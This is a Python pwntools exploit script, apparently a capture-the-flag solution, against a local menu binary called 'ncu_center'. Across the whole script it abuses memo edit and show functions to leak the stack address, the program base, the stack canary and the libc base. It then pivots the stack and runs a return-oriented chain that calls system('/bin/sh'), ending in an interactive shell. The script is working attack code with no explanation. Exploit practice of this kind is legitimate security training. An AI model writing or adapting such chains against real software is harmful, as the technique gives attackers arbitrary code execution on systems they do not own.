from pwn import *

p = process('./ncu_center')
elf = ELF('./ncu_center')
libc = elf.libc

def echo(data):
    p.sendafter('Your choice:', '1')
    p.sendafter('What do you want to say:', data)

def store(index, data):
    p.sendafter('Your choice:', '2')
    p.sendafter('(1 , 2 , 3)?:', str(index))
    p.sendafter(':', data)

def show(index):
    p.sendafter('Your choice:', '3')
    p.sendafter('Which memo page do you want to see (1 , 2 , 3)?:', str(index))

def edit(index, data):
    p.sendafter('Your choice:', '4')
    p.sendafter('hich memo page do you want to edit (1 , 2 , 3)?:', str(index))
    p.sendafter(':', data)

store(1, 'a'*0x10)
store(2, 'b'*0x10)
store(3, 'c'*0x10)
edit(1, 'a')

show(3)
p.recvuntil('c'*0x10)
rbp = u64(p.recv(6).ljust(8, b'\x00')) - 0xf0
success('rbp = 0x%x', rbp)

echo('a'*24)
p.recvuntil('a'*24)
__libc_csu_init = u64(p.recvline().strip().ljust(8, b'\x00'))
success('__libc_csu_init = 0x%x', __libc_csu_init)
base = __libc_csu_init - elf.sym['__libc_csu_init']
success('base address = 0x%x', base)

payload = 'c'*0x18 + 'c'
edit(3, payload)
show(3)
p.recvuntil('c'*0x18)
canary = u64(p.recv(8)) - ord('c')
success('canary = 0x%x', canary)

edit(2, 'b'*0x10)
payload = b'c'*0x28
edit(3, payload)
show(3)
p.recvuntil('c'*0x28)
__libc_start_main = u64(p.recv(6).ljust(8, b'\x00')) - 243
libc_base = __libc_start_main - libc.sym['__libc_start_main']
success('libc base = 0x%x', libc_base)
system = libc_base + libc.sym['system']
success('system = 0x%x', system)
sh = libc_base + next(libc.search(b'/bin/sh\x00'))
success('sh = 0x%x', sh)

leave = 0xb38 + base
pop_rdi = 0x1003 + base
payload = b'c'*0x15 + b'\x00'*3 + p64(canary) + p64(rbp - 0x40-8) + p64(leave)
edit(3, payload)
edit(1,'a')
payload = p64(pop_rdi) + p64(sh)
edit(1, payload)
edit(2, 'a')
payload = p64(system)
edit(2, payload)
p.sendafter('Your choice:', '5')

p.interactive()